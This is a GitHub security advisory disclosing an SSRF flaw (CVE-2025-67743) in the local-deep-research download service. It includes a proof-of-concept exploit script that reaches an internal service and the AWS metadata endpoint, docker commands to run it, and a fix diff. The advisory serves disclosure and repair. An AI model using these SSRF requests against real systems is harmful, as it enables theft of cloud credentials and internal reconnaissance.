# [M] Local Deep Research is Vulnerable to Server-Side Request Forgery (SSRF) in Download Service

## Summary
Severity: Medium
Advisory: GHSA-9c54-gxh7-ppjc
CVE: CVE-2025-67743
CWE: CWE-918
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2025-12-23
Source: https://github.com/advisories/GHSA-9c54-gxh7-ppjc
Type: github-advisory

## Affected
- PyPI: `local-deep-research` — affected >=1.3.0 <1.3.9

## Details
## Summary

The download service (`download_service.py`) makes HTTP requests using raw `requests.get()` without utilizing the application's SSRF protection (`safe_requests.py`). This can allow attackers to access internal services and attempt to reach cloud provider metadata endpoints (AWS/GCP/Azure), as well as perform internal network reconnaissance, by submitting malicious URLs through the API, depending on the deployment and surrounding controls.

**CWE**: CWE-918 (Server-Side Request Forgery)

---

## Details

### Vulnerable Code Location

**File**: `src/local_deep_research/research_library/services/download_service.py`

The application has proper SSRF protection implemented in `security/safe_requests.py` and `security/ssrf_validator.py`, which blocks:
- Loopback addresses (127.0.0.0/8)
- Private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- AWS metadata endpoint (169.254.169.254)
- Link-local addresses

However, `download_service.py` bypasses this protection by using raw `requests.get()` directly:

```python
# Line 1038 - _download_generic method
response = requests.get(url, headers=headers, timeout=30)

# Line 1075
response = requests.get(api_url, timeout=10)

# Line 1100
pdf_response = requests.get(pdf_url, headers=headers, timeout=30)

# Line 1144
response = requests.get(europe_url, headers=headers, timeout=30)

# Line 1187
api_response = requests.get(elink_url, params=params, timeout=10)

# Line 1207
summary_response = requests.get(esummary_url, ...)

# Line 1236
response = requests.get(europe_url, headers=headers, timeout=30)

# Line 1276
response = requests.get(url, headers=headers, timeout=10)

# Line 1298
response = requests.get(europe_url, headers=headers, timeout=30)
```

### Attack Vector

1. Attacker submits a malicious URL via `POST /api/resources/<research_id>`
2. URL is stored in database without SSRF validation (`resource_service.py:add_resource()`)
3. Download is triggered via `/library/api/download/<resource_id>`
4. `download_service.py` fetches the URL using raw `requests.get()`, bypassing SSRF protection

---

## PoC

### Prerequisites

- Docker and Docker Compose installed
- Python 3.11+

### Step 1: Create the Mock Internal Service

**File: `internal_service.py`**

```python
#!/usr/bin/env python3
"""Mock internal service that simulates a sensitive internal endpoint."""

from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class InternalServiceHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        print(f"[INTERNAL SERVICE] {args[0]}")
    
    def do_GET(self):
        print(f"\n{'='*60}")
        print(f"[!] SSRF DETECTED - Internal service accessed!")
        print(f"[!] Path: {self.path}")
        print(f"{'='*60}\n")
        
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        
        secret_data = {
            "status": "SSRF_SUCCESSFUL",
            "message": "You have accessed internal service via SSRF!",
            "internal_secrets": {
                "database_password": "super_secret_db_pass_123",
                "api_key": "sk-internal-api-key-xxxxx",
                "admin_token": "admin_bearer_token_yyyyy"
            }
        }
        self.wfile.write(json.dumps(secret_data, indent=2).encode())

if __name__ == "__main__":
    print("[*] Starting mock internal service on port 8080")
    server = HTTPServer(("0.0.0.0", 8080), InternalServiceHandler)
    server.serve_forever()
```

### Step 2: Create the Exploit Script

**File: `exploit.py`**

```python
#!/usr/bin/env python3
"""SSRF Vulnerability Active PoC"""

import sys
import requests

sys.path.insert(0, '/app/src')

def main():
    print("=" * 70)
    print("SSRF Vulnerability PoC - Active Exploitation")
    print("=" * 70)
    
    internal_url = "http://ssrf-internal-service:8080/secret-data"
    aws_metadata_url = "http://169.254.169.254/latest/meta-data/"
    headers = {"User-Agent": "Mozilla/5.0"}
    
    # EXPLOIT 1: Access internal service
    print("\n[EXPLOIT 1] Accessing internal service via SSRF")
    print(f"    Target: {internal_url}")
    
    try:
        # Same pattern as download_service.py line 1038
        response = requests.get(internal_url, headers=headers, timeout=30)
        print(f"    [!] SSRF SUCCESSFUL! Status: {response.status_code}")
        print(f"    [!] Retrieved secrets:")
        for line in response.text.split('\n')[:15]:
            print(f"        {line}")
    except Exception as e:
        print(f"    [-] Failed: {e}")
        return 1
    
    # EXPLOIT 2: AWS metadata bypass
    print("\n[EXPLOIT 2] AWS Metadata endpoint bypass")
    from local_deep_research.security.ssrf_validator import validate_url
    print(f"    SSRF validator: {'ALLOWED' if validate_url(aws_metadata_url) else 'BLOCKED'}")
    print(f"    But download_service.py BYPASSES the validator!")
    
    try:
        requests.get(aws_metadata_url, timeout=5)
    except requests.exceptions.ConnectionError:
        print(f"    Request sent without SSRF validation!")
    
    print("\n" + "=" * 70)
    print("SSRF VULNERABILITY CONFIRMED")
    print("=" * 70)
    return 0

if __name__ == "__main__":
    sys.exit(main())
```

### Step 3: Run the PoC

```bash
# Build and run with Docker
docker network create ssrf-poc-net
docker run -d --name ssrf-internal-service --network ssrf-poc-net python:3.11-slim sh -c "pip install -q && python internal_service.py"
docker run --rm --network ssrf-poc-net -v ./src:/app/src ssrf-vulnerable-app python exploit.py
```

### Expected Output

```
======================================================================
SSRF Vulnerability PoC - Active Exploitation
======================================================================

[EXPLOIT 1] Accessing internal service via SSRF
    Target: http://ssrf-internal-service:8080/secret-data
    [!] SSRF SUCCESSFUL! Status: 200
    [!] Retrieved secrets:
        {
          "status": "SSRF_SUCCESSFUL",
          "message": "You have accessed internal service via SSRF!",
          "internal_secrets": {
            "database_password": "super_secret_db_pass_123",
            "api_key": "sk-internal-api-key-xxxxx",
            "admin_token": "admin_bearer_token_yyyyy"
          }
        }

[EXPLOIT 2] AWS Metadata endpoint bypass
    SSRF validator: BLOCKED
    But download_service.py BYPASSES the validator!
    Request sent without SSRF validation!

======================================================================
SSRF VULNERABILITY CONFIRMED
======================================================================
```

---

## Impact

### Who is affected?

All users running local-deep-research in:
- **Cloud environments** (AWS, GCP, Azure) - attackers can steal cloud credentials via metadata endpoints
- **Corporate networks** - attackers can access internal services and databases
- **Any deployment** - attackers can scan internal networks

### What can an attacker do?

| Attack | Impact |
|--------|--------|
| Access cloud metadata | Potentially access IAM credentials, API keys, or instance identity in certain cloud configurations |
| Internal service access | Read sensitive data from databases, Redis, admin panels |
| Network reconnaissance | Map internal network topology and services |
| Bypass firewalls | Access services not exposed to the internet |

---

## Recommended Fix

Replace all `requests.get()` calls in `download_service.py` with `safe_get()` from `security/safe_requests.py`:

```diff
# download_service.py

+ from ...security.safe_requests import safe_get

  def _download_generic(self, url, ...):
-     response = requests.get(url, headers=headers, timeout=30)
+     response = safe_get(url, headers=headers, timeout=30)
```

The `safe_get()` function already validates URLs against SSRF attacks before making requests.

### Files to update:
- `src/local_deep_research/research_library/services/download_service.py` (9 occurrences)
- `src/local_deep_research/research_library/downloaders/base.py` (uses `requests.Session`)

---

## References

- [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [AWS SSRF Attacks and IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [PortSwigger: SSRF](https://portswigger.net/web-security/ssrf)

---

Thank you for your work on this project! I'm happy to provide any additional information or help with testing the fix.

## References
- https://github.com/LearningCircuit/local-deep-research/security/advisories/GHSA-9c54-gxh7-ppjc
- https://nvd.nist.gov/vuln/detail/CVE-2025-67743
- https://github.com/LearningCircuit/local-deep-research/commit/b79089ff30c5d9ae77e6b903c408e1c26ad5c055
- https://github.com/LearningCircuit/local-deep-research
